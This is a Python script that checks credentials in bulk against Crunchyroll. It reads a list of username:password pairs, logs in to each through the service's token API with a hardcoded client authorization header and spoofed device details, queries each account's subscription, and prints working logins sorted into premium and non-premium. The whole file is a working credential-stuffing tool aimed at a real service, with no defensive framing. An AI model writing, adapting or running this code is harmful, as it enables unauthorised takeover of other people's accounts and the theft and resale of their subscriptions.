import requests
import uuid
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

def generate_guid():
    return str(uuid.uuid4())

def create_session_with_retries():
    session = requests.Session()
    retries = Retry(
        total=5,  # Number of retries
        backoff_factor=0.5,  # Delay factor for retries (0.5s, 1s, 2s, etc.)
        status_forcelist=[500, 502, 503, 504],  # HTTP status codes to retry on
        raise_on_status=False
    )
    adapter = HTTPAdapter(max_retries=retries)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

def check_account(session, username, password):
    device_id = generate_guid()
    token_url = "https://www.crunchyroll.com/auth/v1/token"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": "Basic eHd4cXhxcmtueWZtZjZ0bHB1dGg6a1ZlQnVUa2JOTGpCbGRMdzhKQk5DTTRSZmlTR3VWa1I=",
    }
    payload = {
        "username": username,
        "password": password,
        "grant_type": "password",
        "scope": "offline_access",
        "device_id": device_id,
        "device_name": "SM-G988N",
        "device_type": "samsung SM-G965N"
    }

    try:
        response = session.post(token_url, data=payload, headers=headers)
        response.raise_for_status()

        if "access_token" not in response.json():
            print(f"[ERROR] Failed to obtain access token for {username}.")
            return None

        access_token = response.json().get("access_token")
    except requests.exceptions.HTTPError as e:
        if e.response.status_code == 401:
            print(f"[INACTIVE] Account {username} is not active.")
        else:
            print(f"[ERROR] Token error for {username}: {e}")
        return None

    account_info_url = "https://www.crunchyroll.com/accounts/v1/me"
    headers["Authorization"] = f"Bearer {access_token}"

    try:
        response = session.get(account_info_url, headers=headers)
        response.raise_for_status()
        external_id = response.json().get("external_id")
        if not external_id:
            print(f"[ERROR] Failed to extract external ID for {username}.")
            return None
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Account info error for {username}: {e}")
        return None

    subscription_url = f"https://www.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits"

    try:
        response = session.get(subscription_url, headers=headers)
        response.raise_for_status()

        subscription_data = response.json()
        plan = subscription_data.get("benefit", "Unknown")
        country = subscription_data.get("subscription_country", "Unknown")

        if plan == "Unknown":
            print(f"[PREMIUM] {username}:{password} - Country: {country}")
            return "premium"
        else:
            print(f"[NON-PREMIUM] {username}:{password} - Plan: {plan}, Country: {country}")
            return "non_premium"
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Subscription info error for {username}: {e}")
        return None

def main():
    session = create_session_with_retries()

    # Prompt the user to provide the file path
    accounts_file = input("Enter the file path to the accounts file: ").strip()

    try:
        with open(accounts_file, 'r') as f:
            accounts = f.readlines()
    except FileNotFoundError:
        print(f"[ERROR] The file '{accounts_file}' does not exist. Please provide a valid file path.")
        return

    premium_accounts = []
    non_premium_accounts = []

    print("\n--- Checking Accounts ---\n")
    for account in accounts:
        try:
            username, password = account.strip().split(':')  # Assuming "username:password" format
            result = check_account(session, username, password)

            if result == "premium":
                premium_accounts.append(f"{username}:{password}")
            elif result == "non_premium":
                non_premium_accounts.append(f"{username}:{password}")
        except ValueError:
            print(f"[ERROR] Invalid account format: {account.strip()}")
    
    print("\n--- Results ---\n")
    print("[PREMIUM ACCOUNTS]")
    if premium_accounts:
        for acc in premium_accounts:
            print(acc)
    else:
        print("No premium accounts found.")

    print("\n[NON-PREMIUM ACCOUNTS]")
    if non_premium_accounts:
        for acc in non_premium_accounts:
            print(acc)
    else:
        print("No non-premium accounts found.")

if __name__ == "__main__":
    main()
